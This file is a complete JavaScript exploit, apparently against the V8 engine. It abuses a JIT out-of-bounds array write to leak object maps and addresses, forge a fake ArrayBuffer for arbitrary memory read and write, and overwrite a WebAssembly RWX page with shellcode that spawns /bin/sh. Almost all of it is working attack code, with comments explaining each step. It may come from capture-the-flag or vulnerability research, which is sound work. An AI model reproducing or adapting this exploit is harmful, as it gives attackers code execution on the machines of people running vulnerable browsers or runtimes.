function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

function f(w, val, addr)
{
	const arr = [addr, 2.2, 3.3];
	// double array
	const o = {idx:3};
	const ret = arr[o.idx];
	// if we put this after `if` statement
	// array length cannot be folded to 3
	gArr = arr;
	// if we don't export it to global,
	// result is always 0xdeadbeef
	// no idea why
	// and we also need it to fetch objects
	if (w)
		arr[o.idx] = val;
	// OOB write
	return ret;
}

for (var i = 0; i < 0x40; i++)
{
	f(1, 1.2, 1.1);
}
/*
provide enough type feedback for w=1 without JIT
otherwise,
"Insufficient type feedback for generic keyed access"
will be produced when w is 1
*/

for (var i = 0; i < 0x4000; i++)
{
	f(0, 1.3, 1.1);
}
// trigger JIT

dArrMapAddr = d2u(f(0, 1.1, 1.1));
print("[*] double Array map = "+hex(dArrMapAddr));
dp(gArr);

abMapAddr = dArrMapAddr - 3600;
oArrMapAddr = dArrMapAddr + 160;
print("[*] ArrayBuffer map = "+hex(abMapAddr));
//dp(new ArrayBuffer(1));
print("[*] object Array map = "+hex(oArrMapAddr));
//dp([[],{}]);

// leak double map address
// then we can obtain other map addresses
// by subtracting and adding an offset

// then to leak other object addresses
// we need to have a object array first
// then convert it to double array
// however,
// we need to write object map to double map.
// we cannot do so in unboxed double,
// since initially it is an object array,
// so we must do so in object pointer.
// so firstly, get double map into js variable

f(1, u2d(oArrMapAddr), u2d(dArrMapAddr));
// write map to oArrMapAddr,
// use dArrMapAddr as fake address
dArrMap = gArr[0];
dp(dArrMap); // <Map(PACKED_DOUBLE_ELEMENTS)>
// now dArrMap is map object of double array

// leaker is used to leak object addresses
function leaker(w, obj1, obj2)
{
	const arr = [obj1, obj2, 0x1337];
	// create object array
	const o = {idx:3};
	if (w)
		arr[o.idx] = dArrMap;
	// make map to double array map
	leakArr = arr;
	// export to global,
	// now we can access its element
	// to leak addresses of obj1 and obj2
}
for (var i = 0; i < 0x40; i++)
{
	leaker(1, [], ()=>1);
}// same, provide enough type feedback
for (var i = 0; i < 0x4000; i++)
{
	leaker(0, [], ()=>1);
}// JIT

fakeAbArr = [u2d(abMapAddr), 0.0, 0.0,
	u2d(0x123), 1.1, u2d(2), 0.0, 0.0];
// fake the ArrayBuffer object
// elements and properties is 0
// backingStore is 1.1,
// which is modified later

leaker(1, fakeAbArr, wmain);
fakeAbAddr = d2u(leakArr[0]);
wmainAddr = d2u(leakArr[1]);
// leak these address of these objects

assert(d2u(leakArr[2]) == 0x133700000000,
	"failed to convert object arr to double arr");

print("[*] array to fake ArrayBuffer = "+hex(fakeAbAddr));
print("[*] wmain = "+hex(wmainAddr));

f(1, u2d(oArrMapAddr), u2d(fakeAbAddr - 0x40))
// fakeAbAddr - 0x40 is the faked ArrayBuffer
fakeAb = gArr[0];
dp(fakeAb);
// okay now we have the faked ArrayBuffer
// we can use this to achieve arbitrary R&W

const dataView = new DataView(fakeAb);
function memRead(addr)
{
	fakeAbArr[4] = u2d(addr);
	// change backingStore to given address
	return d2u(dataView.getFloat64(0, true));
}

rwxAddr = memRead(wmainAddr-1-0x158);
// 0x158 is obtained through debugging
print("[*] RWX page = "+hex(rwxAddr));

fakeAbArr[4] = u2d(rwxAddr);
// change backingStore to rwxAddr

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode

throw Error("failed to execute shellcode!");